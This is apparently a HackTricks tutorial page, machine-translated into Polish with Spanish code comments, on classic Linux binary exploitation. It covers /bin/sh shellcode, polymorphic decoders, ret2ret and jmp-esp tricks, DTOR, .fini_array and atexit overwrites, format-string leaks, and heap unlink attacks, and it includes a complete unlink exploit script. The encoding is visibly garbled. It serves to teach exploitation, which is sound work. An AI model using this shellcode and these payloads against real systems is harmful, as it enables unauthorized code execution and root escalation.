# Eksploitacja systemu Linux (Podstawy)

<details>

<summary><strong>Nauka hakowania AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* JeÅ›li chcesz zobaczyÄ‡ swojÄ… **firmÄ™ reklamowanÄ… w HackTricks** lub **pobraÄ‡ HackTricks w formacie PDF**, sprawdÅº [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* ZdobÄ…dÅº [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/collection/the-peass-family), naszÄ… kolekcjÄ™ ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel siÄ™ swoimi sztuczkami hakowania, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) na GitHubie.

</details>

## **2.SHELLCODE**

View kernel interrupts: cat /usr/include/i386-linux-gnu/asm/unistd\_32.h | grep â€œ\_\_NR\_â€

setreuid(0,0); // \_\_NR\_setreuid 70\
execve(â€œ/bin/shâ€, args\[], NULL); // \_\_NR\_execve 11\
exit(0); // \_\_NR\_exit 1

xor eax, eax ; clear eax\
xor ebx, ebx ; ebx = 0 as there are no arguments to pass\
mov al, 0x01 ; eax = 1 â€”> \_\_NR\_exit 1\
int 0x80 ; Execute syscall

**nasm -f elf assembly.asm** â€”> Returns a .o file\
**ld assembly.o -o shellcodeout** â€”> Gives us an executable formed by the assembly code and we can extract the opcodes with **objdump**\
**objdump -d -Mintel ./shellcodeout** â€”> To verify that it is indeed our shellcode and extract the OpCodes

**Verify that the shellcode works**
```
char shellcode[] = â€œ\x31\xc0\x31\xdb\xb0\x01\xcd\x80â€

void main(){
void (*fp) (void);
fp = (void *)shellcode;
fp();
}<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">â€‹</span>
```
Aby sprawdziÄ‡, czy wywoÅ‚ania systemowe sÄ… wykonywane poprawnie, naleÅ¼y skompilowaÄ‡ poprzedni program, a wywoÅ‚ania systemowe powinny pojawiÄ‡ siÄ™ w **strace ./SKOMPILOWANY\_PROGRAM**

Podczas tworzenia shellcode'u moÅ¼na zastosowaÄ‡ sztuczkÄ™. Pierwsza instrukcja to skok do wywoÅ‚ania. WywoÅ‚anie wykonuje oryginalny kod i dodatkowo umieszcza EIP na stosie. Po instrukcji call umieszczamy potrzebny nam ciÄ…g znakÃ³w, dziÄ™ki czemu za pomocÄ… tego EIP moÅ¼emy wskazaÄ‡ na ciÄ…g znakÃ³w i kontynuowaÄ‡ wykonywanie kodu.

EJ **SZTUCZKA (/bin/sh)**:
```
jmp                 0x1f                                        ; Salto al Ãºltimo call
popl                %esi                                       ; Guardamos en ese la direcciÃ³n al string
movl               %esi, 0x8(%esi)       ; Concatenar dos veces el string (en este caso /bin/sh)
xorl                 %eax, %eax             ; eax = NULL
movb  %eax, 0x7(%esi)     ; Ponemos un NULL al final del primer /bin/sh
movl               %eax, 0xc(%esi)      ; Ponemos un NULL al final del segundo /bin/sh
movl   $0xb, %eax               ; Syscall 11
movl               %esi, %ebx               ; arg1=â€œ/bin/shâ€
leal                 0x8(%esi), %ecx      ; arg[2] = {â€œ/bin/shâ€, â€œ0â€}
leal                 0xc(%esi), %edx      ; arg3 = NULL
int                    $0x80                         ; excve(â€œ/bin/shâ€, [â€œ/bin/shâ€, NULL], NULL)
xorl                 %ebx, %ebx             ; ebx = NULL
movl   %ebx, %eax
inc                   %eax                          ; Syscall 1
int                    $0x80                         ; exit(0)
call                  -0x24                          ; Salto a la primera instruciÃ³n
.string             \â€/bin/sh\â€                               ; String a usar<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">â€‹</span>
```
**UÅ¼ycie ESP z uÅ¼yciem stosu (/bin/sh):**
```
section .text
global _start
_start:
xor                  eax, eax                     ;Limpieza
mov                al, 0x46                      ; Syscall 70
xor                  ebx, ebx                     ; arg1 = 0
xor                  ecx, ecx                     ; arg2 = 0
int                    0x80                           ; setreuid(0,0)
xor                  eax, eax                     ; eax = 0
push   eax                             ; â€œ\0â€
push               dword 0x68732f2f ; â€œ//shâ€
push               dword 0x6e69622f; â€œ/binâ€
mov                ebx, esp                     ; arg1 = â€œ/bin//sh\0â€
push               eax                             ; Null -> args[1]
push               ebx                             ; â€œ/bin/sh\0â€ -> args[0]
mov                ecx, esp                     ; arg2 = args[]
mov                al, 0x0b                      ; Syscall 11
int                    0x80                           ; excve(â€œ/bin/shâ€, args[â€œ/bin/shâ€, â€œNULLâ€], NULL)
```
**EJ FNSTENV:**
```
fabs
fnstenv [esp-0x0c]
pop eax                     ; Guarda el EIP en el que se ejecutÃ³ fabs
â€¦
```
**Åowca jajek:**

Polega na maÅ‚ym kodzie, ktÃ³ry przeszukuje strony pamiÄ™ci powiÄ…zane z procesem w poszukiwaniu tam przechowywanej shellcode (szuka jakiegoÅ› podpisu umieszczonego w shellcode). Przydatne w przypadkach, gdy jest tylko niewielka przestrzeÅ„ do wstrzykniÄ™cia kodu.

**Shellkody polimorficzne**

PolegajÄ… na zaszyfrowanych shellach, ktÃ³re posiadajÄ… maÅ‚e kody deszyfrujÄ…ce i skaczÄ…ce do nich, uÅ¼ywajÄ…c sztuczki Call-Pop, oto **przykÅ‚ad zaszyfrowanego szyfru Cezara**:
```
global _start
_start:
jmp short magic
init:
pop     esi
xor      ecx, ecx
mov    cl,0                              ; Hay que sustituir el 0 por la longitud del shellcode (es lo que recorrerÃ¡)
desc:
sub     byte[esi + ecx -1], 0 ; Hay que sustituir el 0 por la cantidad de bytes a restar (cifrado cesar)
sub     cl, 1
jnz       desc
jmp     short sc
magic:
call init
sc:
;AquÃ­ va el shellcode
```
## **5. Metody uzupeÅ‚niajÄ…ce**

**Ret2Ret**

Przydatne, gdy nie moÅ¼na umieÅ›ciÄ‡ adresu stosu w EIP (sprawdzane jest, czy EIP nie zawiera 0xbf) lub gdy nie moÅ¼na obliczyÄ‡ lokalizacji shellcode. Jednak funkcja podatna akceptuje parametr (shellcode zostanie umieszczona tutaj).

W ten sposÃ³b, zmieniajÄ…c EIP na adres **ret**, zostanie zaÅ‚adowany nastÄ™pny adres (ktÃ³ry jest adresem pierwszego argumentu funkcji). Innymi sÅ‚owy, zostanie zaÅ‚adowana shellcode.

Exploit bÄ™dzie wyglÄ…daÅ‚ tak: SHELLCODE + WypeÅ‚nienie (do EIP) + **\&ret** (nastÄ™pne bajty stosu wskazujÄ… na poczÄ…tek shellcode, poniewaÅ¼ adres przekazany do stosu wskazuje na argument przekazany)

WyglÄ…da na to, Å¼e funkcje takie jak **strncpy** po zakoÅ„czeniu usuwajÄ… ze stosu adres, w ktÃ³rym przechowywana byÅ‚a shellcode, uniemoÅ¼liwiajÄ…c tÄ™ technikÄ™. Innymi sÅ‚owy, adres przekazywany funkcji jako argument (ten, ktÃ³ry przechowuje shellcode) jest modyfikowany na 0x00, wiÄ™c po wywoÅ‚aniu drugiego **ret** program napotyka na 0x00 i koÅ„czy dziaÅ‚anie.

**Technika Murata**

W systemie Linux wszystkie programy sÄ… mapowane zaczynajÄ…c od 0xbfffffff.

AnalizujÄ…c, jak jest budowany stos nowego procesu w systemie Linux, moÅ¼na opracowaÄ‡ exploit tak, aby program zostaÅ‚ uruchomiony w Å›rodowisku, w ktÃ³rym jedynÄ… zmiennÄ… jest shellcode. Adres tej zmiennej moÅ¼na obliczyÄ‡ jako: addr = 0xbfffffff - 4 - strlen(NAZWA\_PEÅNEGO\_PLIKU\_WYKONAWCZEGO) - strlen(shellcode)

W ten sposÃ³b moÅ¼na Å‚atwo uzyskaÄ‡ adres zmiennej Å›rodowiskowej z shellcode.

MoÅ¼liwe jest to dziÄ™ki funkcji execle, ktÃ³ra pozwala tworzyÄ‡ Å›rodowisko zawierajÄ…ce tylko poÅ¼Ä…dane zmienne Å›rodowiskowe.

**Skok do ESP: Styl Windows**

PoniewaÅ¼ ESP zawsze wskazuje na poczÄ…tek stosu, ta technika polega na zastÄ…pieniu EIP adresem wywoÅ‚ania **jmp esp** lub **call esp**. W ten sposÃ³b shellcode jest zapisywana po nadpisaniu EIP, poniewaÅ¼ po wykonaniu **ret** ESP wskazuje na nastÄ™pny adres, dokÅ‚adnie tam, gdzie zapisano shellcode.

W przypadku braku aktywnego ASLR w systemie Windows lub Linux moÅ¼na wywoÅ‚aÄ‡ **jmp esp** lub **call esp** przechowywane w jakimÅ› obiekcie wspÃ³Å‚dzielonym. JeÅ›li ASLR jest aktywny, moÅ¼na poszukaÄ‡ ich w samym programie podatnym.

Ponadto moÅ¼liwoÅ›Ä‡ umieszczenia shellcode po skorumpowaniu EIP zamiast w Å›rodku stosu pozwala uniknÄ…Ä‡ dotkniÄ™cia shellcode przez instrukcje push lub pop wykonywane w trakcie funkcji (co mogÅ‚oby siÄ™ zdarzyÄ‡, gdyby byÅ‚a umieszczona w Å›rodku stosu funkcji).

Podobnie, jeÅ›li wiadomo, Å¼e funkcja zwraca adres, w ktÃ³rym przechowywana jest shellcode, moÅ¼na wywoÅ‚aÄ‡ **call eax** lub **jmp eax (ret2eax).**

**PrzepeÅ‚nienia liczb caÅ‚kowitych**

Tego rodzaju przepeÅ‚nienia wystÄ™pujÄ…, gdy zmienna nie jest przygotowana na obsÅ‚ugÄ™ tak duÅ¼ej liczby, jakÄ… siÄ™ jej przekazuje, byÄ‡ moÅ¼e z powodu pomyÅ‚ki miÄ™dzy zmiennymi ze znakiem i bez znaku, na przykÅ‚ad:
```c
#include <stdion.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char *argv[]){
int len;
unsigned int l;
char buffer[256];
int i;
len = l = strtoul(argv[1], NULL, 10);
printf("\nL = %u\n", l);
printf("\nLEN = %d\n", len);
if (len >= 256){
printf("\nLongitus excesiva\n");
exit(1);
}
if(strlen(argv[2]) < l)
strcpy(buffer, argv[2]);
else
printf("\nIntento de hack\n");
return 0;
}
```
W powyÅ¼szym przykÅ‚adzie widzimy, Å¼e program oczekuje 2 parametrÃ³w. Pierwszy to dÅ‚ugoÅ›Ä‡ nastÄ™pnego ciÄ…gu, a drugi to sam ciÄ…g.

JeÅ›li podamy jako pierwszy parametr liczbÄ™ ujemnÄ…, program wyÅ›wietli, Å¼e len < 256 i przejdzie przez ten filtr, a ponadto strlen(buffer) bÄ™dzie mniejsze niÅ¼ l, poniewaÅ¼ l jest typu unsigned int i bÄ™dzie bardzo duÅ¼e.

Ten rodzaj przepeÅ‚nieÅ„ nie ma na celu zapisywania czegoÅ› w procesie programu, ale przejÅ›cie przez Åºle zaprojektowane filtry w celu wykorzystania innych podatnoÅ›ci.

**Zmienne niezainicjowane**

Nie wiadomo, jaka wartoÅ›Ä‡ moÅ¼e przyjÄ…Ä‡ zmienna niezainicjowana, co moÅ¼e byÄ‡ interesujÄ…ce do obserwacji. MoÅ¼e siÄ™ okazaÄ‡, Å¼e przyjmie wartoÅ›Ä‡ zmiennej z poprzedniej funkcji, ktÃ³ra jest kontrolowana przez atakujÄ…cego.

##

###

###

###

### **.fini\_array**

W zasadzie jest to struktura z **funkcjami, ktÃ³re zostanÄ… wywoÅ‚ane** przed zakoÅ„czeniem programu. Jest to interesujÄ…ce, jeÅ›li moÅ¼na wywoÅ‚aÄ‡ **swoje shellcode, skaczÄ…c do okreÅ›lonego adresu**, lub w przypadkach, gdy trzeba wrÃ³ciÄ‡ ponownie do funkcji main, aby **wykorzystaÄ‡ drugi raz formatowanie Å‚aÅ„cucha**.
```bash
objdump -s -j .fini_array ./greeting

./greeting:     file format elf32-i386

Contents of section .fini_array:
8049934 a0850408

#Put your address in 0x8049934
```
ZauwaÅ¼, Å¼e to **nie** spowoduje **wiecznej pÄ™tli**, poniewaÅ¼ gdy wrÃ³cisz do gÅ‚Ã³wnej funkcji, canary zauwaÅ¼y, Å¼e koniec stosu moÅ¼e byÄ‡ uszkodzony i funkcja nie zostanie ponownie wywoÅ‚ana. DziÄ™ki temu bÄ™dziesz mÃ³gÅ‚ **wykonaÄ‡ 1 dodatkowe** wywoÅ‚anie podatnoÅ›ci.

### **Formatowanie Å‚aÅ„cucha znakÃ³w do wycieku zawartoÅ›ci**

ÅaÅ„cuch znakÃ³w moÅ¼e rÃ³wnieÅ¼ byÄ‡ wykorzystany do **wycieku zawartoÅ›ci** z pamiÄ™ci programu.\
Na przykÅ‚ad, w nastÄ™pujÄ…cej sytuacji istnieje **zmienna lokalna na stosie wskazujÄ…ca na flagÄ™**. JeÅ›li **znajdziesz**, gdzie w **pamiÄ™ci** jest **wskaÅºnik** do **flagi**, moÅ¼esz sprawiÄ‡, Å¼e **printf** uzyska dostÄ™p do tego **adresu** i **wyÅ›wietli** flagÄ™:

WiÄ™c flaga jest pod adresem **0xffffcf4c**

![](<../../.gitbook/assets/image (618) (2).png>)

A z wycieku widaÄ‡, Å¼e **wskaÅºnik do flagi** znajduje siÄ™ w **8. parametrze**:

![](<../../.gitbook/assets/image (623).png>)

WiÄ™c, **uzyskujÄ…c dostÄ™p** do **8. parametru**, moÅ¼esz uzyskaÄ‡ flagÄ™:

![](<../../.gitbook/assets/image (624).png>)

ZauwaÅ¼, Å¼e po **poprzednim ataku** i zrozumieniu, Å¼e moÅ¼esz **wyciekaÄ‡ zawartoÅ›Ä‡**, moÅ¼esz **ustawiÄ‡ wskaÅºniki** na **`printf`** w sekcji, gdzie jest **zaÅ‚adowany** **plik wykonywalny** i **wyciekaÄ‡** go **caÅ‚kowicie**!

### **DTOR**

{% hint style="danger" %}
Obecnie jest bardzo **dziwne znalezienie binarnego pliku z sekcjÄ… dtor**.
{% endhint %}

Destruktory to funkcje, ktÃ³re sÄ… **wykonywane przed zakoÅ„czeniem programu**.\
JeÅ›li uda ci siÄ™ **zapisaÄ‡** adres **shellcode** w **`__DTOR_END__`**, to zostanie **wykonany** przed zakoÅ„czeniem programu.\
Uzyskaj adres tej sekcji za pomocÄ…:
```bash
objdump -s -j .dtors /exec
rabin -s /exec | grep â€œ__DTORâ€
```
Zazwyczaj znajdziesz sekcjÄ™ **DTOR** **miÄ™dzy** wartoÅ›ciami `ffffffff` i `00000000`. JeÅ›li widzisz tylko te wartoÅ›ci, oznacza to, Å¼e **nie ma zarejestrowanej Å¼adnej funkcji**. **Nadpisz** wiÄ™c **`00000000`** adresem **shellcode**, aby go wykonaÄ‡.

### **Formatowanie Å‚aÅ„cuchÃ³w do przepeÅ‚nieÅ„ bufora**

Funkcja **sprintf** przesuwa sformatowany Å‚aÅ„cuch **do** zmiennej. Dlatego moÅ¼na naduÅ¼yÄ‡ **formatowania** Å‚aÅ„cucha, aby spowodowaÄ‡ **przepeÅ‚nienie bufora w zmiennej**, do ktÃ³rej jest kopiowana zawartoÅ›Ä‡.\
Na przykÅ‚ad Å‚adunek `%.44xAAAA` **zapisze 44B+"AAAA" w zmiennej**, co moÅ¼e spowodowaÄ‡ przepeÅ‚nienie bufora.

### **Struktury \_\_atexit**

{% hint style="danger" %}
Obecnie jest bardzo **dziwne, aby to wykorzystaÄ‡**.
{% endhint %}

Funkcja **`atexit()`** to funkcja, do ktÃ³rej **przekazywane sÄ… inne funkcje jako parametry**. Te **funkcje** zostanÄ… **wykonane** podczas wykonywania **`exit()`** lub **powrotu** do **main**.\
JeÅ›li moÅ¼na **zmodyfikowaÄ‡** **adres** ktÃ³rejÅ› z tych **funkcji**, aby wskazywaÅ‚ na shellcode na przykÅ‚ad, uzyskasz **kontrolÄ™** nad **procesem**, ale obecnie jest to bardziej skomplikowane.\
Obecnie **adresy funkcji** do wykonania sÄ… **ukryte** za kilkoma strukturami, a ostatecznie adres, do ktÃ³rego wskazujÄ…, nie jest adresem funkcji, ale jest **zaszyfrowany za pomocÄ… operacji XOR** i przesuniÄ™Ä‡ z **losowym kluczem**. Dlatego obecnie ten wektor ataku **nie jest bardzo przydatny przynajmniej na x86** i **x64\_86**.\
Funkcja **szyfrowania** to **`PTR_MANGLE`**. **Inne architektury** takie jak m68k, mips32, mips64, aarch64, arm, hppa... **nie implementujÄ… funkcji szyfrowania**, poniewaÅ¼ **zwracajÄ… to samo**, co otrzymaÅ‚y jako dane wejÅ›ciowe. Dlatego te architektury mogÄ… byÄ‡ podatne na ten wektor ataku.

### **setjmp() & longjmp()**

{% hint style="danger" %}
Obecnie jest bardzo **dziwne, aby to wykorzystaÄ‡**.
{% endhint %}

**`Setjmp()`** pozwala **zapisaÄ‡** **kontekst** (rejestry)\
**`longjmp()`** pozwala **przywrÃ³ciÄ‡** **kontekst**.\
Zapisane rejestry to: `EBX, ESI, EDI, ESP, EIP, EBP`\
To, co siÄ™ dzieje, to Å¼e EIP i ESP sÄ… przekazywane przez funkcjÄ™ **`PTR_MANGLE`**, wiÄ™c **architektura podatna na ten atak jest taka sama jak powyÅ¼ej**.\
SÄ… one przydatne do odzyskiwania bÅ‚Ä™dÃ³w lub przerwaÅ„.\
Jednak z tego, co przeczytaÅ‚em, inne rejestry nie sÄ… chronione, **wiÄ™c jeÅ›li wewnÄ…trz wywoÅ‚ywanej funkcji jest `call ebx`, `call esi` lub `call edi`**, kontrolÄ™ moÅ¼na przejÄ…Ä‡. Lub moÅ¼na rÃ³wnieÅ¼ zmodyfikowaÄ‡ EBP, aby zmodyfikowaÄ‡ ESP.

**VTable i VPTR w C++**

KaÅ¼da klasa ma **Vtable**, ktÃ³ra jest tablicÄ… **wskaÅºnikÃ³w do metod**.

KaÅ¼dy obiekt klasy ma **VPtr**, ktÃ³ry jest **wskaÅºnikiem** do tablicy swojej klasy. VPtr jest czÄ™Å›ciÄ… nagÅ‚Ã³wka kaÅ¼dego obiektu, wiÄ™c jeÅ›li **nadpiszesz** **VPtr**, moÅ¼na go **zmieniÄ‡**, aby wskazywaÅ‚ na metodÄ™-dummy, dziÄ™ki czemu wykonanie funkcji przejdzie do shellcode.

## **Åšrodki zapobiegawcze i unikanie**

###

**ZastÄ…pienie Libsafe**

WÅ‚Ä…cza siÄ™ za pomocÄ…: LD\_PRELOAD=/lib/libsafe.so.2\
lub\
â€œ/lib/libsave.so.2â€ > /etc/ld.so.preload

NiektÃ³re niebezpieczne wywoÅ‚ania funkcji sÄ… przechwytywane przez bezpieczne wywoÅ‚ania. Nie jest to standaryzowane. (tylko dla x86, nie dla kompilacji z -fomit-frame-pointer, nie dla statycznych kompilacji, nie wszystkie funkcje podatne na atak stajÄ… siÄ™ bezpieczne, a LD\_PRELOAD nie dziaÅ‚a w binariach z ustawionym suid).

**ASCII Armored Address Space**

Polega na zaÅ‚adowaniu wspÃ³Å‚dzielonych bibliotek od 0x00000000 do 0x00ffffff, aby zawsze byÅ‚ bajt 0x00. JednakÅ¼e to naprawdÄ™ nie zatrzymuje praktycznie Å¼adnego ataku, a tym bardziej w little endian.

**ret2plt**

Polega na wykonaniu ROP w taki sposÃ³b, Å¼e wywoÅ‚ywana jest funkcja strcpy@plt (z plt) i wskazuje siÄ™ na wpis w GOT, a nastÄ™pnie kopiowany jest pierwszy bajt funkcji, do ktÃ³rej chcemy wywoÅ‚aÄ‡ (system()). NastÄ™pnie to samo jest robione wskazujÄ…c na GOT+1 i kopiujÄ…c 2. bajt system()... Na koÅ„cu wywoÅ‚ywany jest zapisany adres w GOT, ktÃ³ry bÄ™dzie system()

**Klatki z chroot()**

debootstrap -arch=i386 hardy /home/user â€”> Instaluje podstawowy system w okreÅ›lonym podkatalogu

Administrator moÅ¼e wyjÅ›Ä‡ z takiej klatki wykonujÄ…c: mkdir foo; chroot foo; cd ..

**Instrumentacja kodu**

Valgrind â€”> Szuka bÅ‚Ä™dÃ³w\
Memcheck\
RAD (Return Address Defender)\
Insure++

## **8 PrzepeÅ‚nienia sterty: Podstawowe ataki**

**Przydzielony kawaÅ‚ek**

prev\_size |\
size | â€”NagÅ‚Ã³wek\
\*mem | Dane

**Wolny kawaÅ‚ek**

prev\_size |\
size |\
\*fd | WskaÅºnik na nastÄ™pny kawaÅ‚ek\
\*bk | WskaÅºnik na poprzedni kawaÅ‚ek â€”NagÅ‚Ã³wek\
\*mem | Dane

Wolne kawaÅ‚ki sÄ… w liÅ›cie dwukierunkowej (bin) i nigdy nie mogÄ… byÄ‡ dwa wolne kawaÅ‚ki obok siebie (sÄ… Å‚Ä…czone)

W "size" sÄ… bity wskazujÄ…ce: czy poprzedni kawaÅ‚ek jest uÅ¼ywany, czy kawaÅ‚ek zostaÅ‚ przydzielony za pomocÄ… mmap() i czy kawaÅ‚ek naleÅ¼y do gÅ‚Ã³wnego obszaru.

Po zwolnieniu kawaÅ‚ka, jeÅ›li ktÃ³rykolwiek z sÄ…siednich jest wolny, sÄ… one Å‚Ä…czone za pomocÄ… makra unlink() i nowy, wiÄ™kszy kawaÅ‚ek jest przekazywany do frontlink() w celu wstawienia go do odpowiedniego binu.

unlink(){\
BK = P->bk; â€”> BK nowego kawaÅ‚ka to BK poprzedniego wolnego kawaÅ‚ka\
FD = P->fd; â€”> FD nowego kawaÅ‚ka to FD poprzedniego wolnego kawaÅ‚ka\
FD->bk = BK; â€”> BK nastÄ™pnego kawaÅ‚ka wskazuje na nowy kawaÅ‚ek\
BK->fd = FD; â€”> FD poprzedniego kawaÅ‚ka wskazuje na nowy kawaÅ‚ek\
}

Dlatego jeÅ›li uda siÄ™ zmodyfikowaÄ‡ P->bk adresem shellcode i P->fd adresem w DTORS lub GOT pomniejszonym o 12, osiÄ…gniesz:

BK = P->bk = \&shellcode\
FD = P->fd = &\_\_dtor\_end\_\_ - 12\
FD->bk = BK -> \*((&\_\_dtor\_end\_\_ - 12) + 12) = \&shellcode

W ten sposÃ³b shellcode zostanie wykonana po opuszczeniu programu.

Dodatkowo, 4. instrukcja unlink() zapisuje coÅ›, a shellcode musi byÄ‡ dostosowana do tego:

BK->fd = FD -> \*(\&shellcode + 8) = (&\_\_dtor\_end\_\_ - 12) â€”> Spowoduje to zapisanie 4 bajtÃ³w od 8 bajtu shellcode, dlatego pierwsza instrukcja shellcode musi byÄ‡ skokiem, aby ominÄ…Ä‡ to i przejÅ›Ä‡ do nops prowadzÄ…cych do reszty shellcode.

Dlatego exploit jest tworzony:

W buforze1 umieszczamy shellcode zaczynajÄ…c od skoku, aby przejÅ›Ä‡ do nops lub reszty shellcode.

NastÄ™pnie po shellcode dodajemy wypeÅ‚nienie do osiÄ…gniÄ™cia pola prev\_size i size nastÄ™pnego kawaÅ‚ka. W tych miejscach umieszczamy 0xfffffff0 (aby nadpisaÄ‡ prev\_size i ustawiÄ‡ bit wskazujÄ…cy, Å¼e jest wolny) i â€œ-4â€ (0xfffffffc) w size (aby podczas sprawdzania w 3. kawaÅ‚ku, czy 2. byÅ‚ wolny, w rzeczywistoÅ›ci przejdzie do zmodyfikowanego prev\_size, ktÃ³ry powie, Å¼e jest wolny) -> Dlatego gdy free() sprawdzi, przejdzie do size 3., ale w rzeczywistoÅ›ci przejdzie do 2. - 4 i uzna, Å¼e 2. kawaÅ‚ek jest wolny. NastÄ™pnie wywoÅ‚a **unlink()**.

Podczas wywoÅ‚ywania unlink() uÅ¼yje danych z poczÄ…tku 2. kawaÅ‚ka jako P->fd, wiÄ™c tam zostanie wstawiony adres, ktÃ³ry chcesz nadpisaÄ‡ - 12 (poniewaÅ¼ w FD->bk zostanie dodane 12 do adresu przechowywanego w FD). A pod tym adresem zostanie umieszczony drugi adres z 2. kawaÅ‚ka, ktÃ³ry bÄ™dzie interesujÄ…cy dla nas jako adres shellcode (faÅ‚szywy P->bk).
**shellcode = "\xeb\x0caaaabbbbcccc" #skok 12 + 12 bajtÃ³w wypeÅ‚nienia**

**shellcode += "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" \\**

**"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" \\**

**"\x80\xe8\xdc\xff\xff\xff/bin/sh";**

**prev\_size = pack("\<Iâ€, 0xfffffff0) #Interesa que el bit que indica que el anterior trozo estÃ¡ libre estÃ© a 1**

**fake\_size = pack("\<Iâ€, 0xfffffffc) #-4, para que piense que el â€œsizeâ€ del 3Âº trozo estÃ¡ 4bytes detrÃ¡s (apunta a prev\_size) pues es ahÃ­ donde mira si el 2Âº trozo estÃ¡ libre**

**addr\_sc = pack("\<I", 0x0804a008 + 8) #W Å‚adunku na poczÄ…tku dodajemy 8 bajtÃ³w wypeÅ‚nienia**

**got\_free = pack("\<I", 0x08048300 - 12) #Adres free() w plt-12 (bÄ™dzie nadpisany, aby uruchomiÄ‡ shellcode drugi raz, gdy free() zostanie wywoÅ‚ane ponownie)**

**payload = "aaaabbbb" + shellcode + "b"\*(512-len(shellcode)-8) #Jak wspomniano, Å‚adunek zaczyna siÄ™ od 8 bajtÃ³w wypeÅ‚nienia**

**payload += prev\_size + fake\_size + got\_free + addr\_sc #Modyfikujemy 2. kawaÅ‚ek, got\_free wskazuje, gdzie zapiszemy adres addr\_sc + 12**

**os.system("./8.3.o " + payload)**

**unset() zwalniajÄ…c w odwrotnej kolejnoÅ›ci (wargame)**

Kontrolujemy 3 kolejne fragmenty i sÄ… one zwalniane w odwrotnej kolejnoÅ›ci niÅ¼ zarezerwowane.

W tym przypadku:

W fragmencie c umieszczamy shellcode

Fragment a uÅ¼ywamy do nadpisania b, aby rozmiar miaÅ‚ wyÅ‚Ä…czony bit PREV\_INUSE, aby myÅ›laÅ‚, Å¼e fragment a jest wolny.

Dodatkowo, nadpisujemy w nagÅ‚Ã³wku b rozmiar, aby wynosiÅ‚ -4.

W rezultacie program uzna, Å¼e â€aâ€ jest wolny i w binie, wiÄ™c wywoÅ‚a unlink() aby go odÅ‚Ä…czyÄ‡. JednakÅ¼e, poniewaÅ¼ nagÅ‚Ã³wek PREV\_SIZE wynosi -4, uzna, Å¼e fragment â€aâ€ zaczyna siÄ™ naprawdÄ™ w b+4. Innymi sÅ‚owy, wywoÅ‚a unlink() na fragmencie rozpoczynajÄ…cym siÄ™ od b+4, wiÄ™c w b+12 bÄ™dzie wskaÅºnik â€fdâ€, a w b+16 bÄ™dzie wskaÅºnik â€bkâ€.

W ten sposÃ³b, jeÅ›li w bk umieÅ›cimy adres shellcode, a w fd umieÅ›cimy adres funkcji â€puts()â€-12, mamy nasz payload.

**Technika Frontlink**

Frontlink jest wywoÅ‚ywany, gdy coÅ› jest zwalniane i Å¼aden z sÄ…siednich fragmentÃ³w nie jest wolny, wtedy nie jest wywoÅ‚ywane unlink(), ale bezpoÅ›rednio frontlink().

UÅ¼yteczna podatnoÅ›Ä‡, gdy atakowany malloc nigdy nie jest zwalniany (free()).

Wymagane:

Bufor, ktÃ³ry moÅ¼e zostaÄ‡ przepeÅ‚niony funkcjÄ… wejÅ›ciowÄ…

Bufor sÄ…siadujÄ…cy z tym, ktÃ³ry zostanie zwolniony, a ktÃ³ry bÄ™dzie modyfikowany przez przepeÅ‚nienie poprzedniego bufora

Bufor do zwolnienia o rozmiarze wiÄ™kszym niÅ¼ 512, ale mniejszym niÅ¼ poprzedni bufor

Bufor zadeklarowany przed krokiem 3, ktÃ³ry pozwala na nadpisanie prev\_size tego bufora

W ten sposÃ³b, nadpisujÄ…c w dwÃ³ch mallocach w sposÃ³b niekontrolowany i w jednym kontrolowanym, ktÃ³ry jest zwalniany tylko raz, moÅ¼emy przeprowadziÄ‡ exploit.

**PodatnoÅ›Ä‡ double free()**

JeÅ›li free() jest wywoÅ‚ywane dwa razy z tym samym wskaÅºnikiem, powstajÄ… dwa biny wskazujÄ…ce na ten sam adres.

JeÅ›li chcemy ponownie uÅ¼yÄ‡ jednego, zostanie on przydzielony bez problemÃ³w. JeÅ›li chcemy uÅ¼yÄ‡ innego, zostanie on przydzielony ten sam obszar, wiÄ™c mamy faÅ‚szywe wskaÅºniki â€fdâ€ i â€bkâ€ z danymi, ktÃ³re zapisze poprzednia rezerwacja.

**After free()**

WczeÅ›niej zwolniony wskaÅºnik jest ponownie uÅ¼ywany bez kontroli.

## **8 PrzepeÅ‚nienia sterty: Zaawansowane exploitacje**

Techniki Unlink() i FrontLink() zostaÅ‚y usuniÄ™te po zmodyfikowaniu funkcji unlink().

**The house of mind**

Wystarczy jedno wywoÅ‚anie free(), aby spowodowaÄ‡ wykonanie arbitralnego kodu. WaÅ¼ne jest znalezienie drugiego fragmentu, ktÃ³ry moÅ¼e zostaÄ‡ przepeÅ‚niony przez poprzedni i zwolniony.

WywoÅ‚anie free() powoduje wywoÅ‚anie public\_fREe(mem), ktÃ³ry wykonuje:

mstate ar\_ptr;

mchunkptr p;

â€¦

p = mem2chunk(mes); â€”> Zwraca wskaÅºnik do miejsca, od ktÃ³rego zaczyna siÄ™ fragment (mem-8)

â€¦

ar\_ptr = arena\_for_chunk(p); â€”> chunk\_non\_main\_arena(ptr)?heap\_for\_ptr(ptr)->ar\_ptr:\&main\_arena \[1]

â€¦

\_int\_free(ar\_ptr, mem);

}

